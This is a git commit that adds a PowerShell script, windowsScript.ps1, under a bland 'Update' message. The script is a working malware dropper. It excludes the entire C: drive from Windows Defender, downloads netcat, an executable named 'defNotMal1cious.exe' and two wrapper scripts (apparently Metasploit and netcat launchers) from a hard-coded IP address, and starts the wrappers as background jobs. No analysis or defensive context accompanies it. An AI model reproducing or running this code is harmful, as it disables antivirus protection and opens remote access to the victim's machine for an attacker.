d3f4131766b22b506c8eeeb7df76afa1b126ce4c
soupsamich <66322946+soupsamich@users.noreply.github.com>
2020-06-27 01:00:39 -0400

    Update windowsScript.ps1

--- windowsScript.ps1
+++ windowsScript.ps1
@@ -1,1 +1,7 @@
-
+Add-MpPreference -ExclusionPath "C:\";
+Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/nc.exe -OutFile C:/nc.exe;
+Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/defNotMal1cious.exe -OutFile C:/defNotMalicious.exe;
+Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/windowsWrapperMSF.ps1 -OutFile C:/windowsWrapperMSF.ps1;
+Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/windowsWrapperNC.ps1 -OutFile C:/windowsWrapperNC.ps1;
+Start-Job -ScriptBlock {C:/windowsWrapperMSF.ps1};
+Start-Job -ScriptBlock {C:/windowsWrapperNC.ps1};
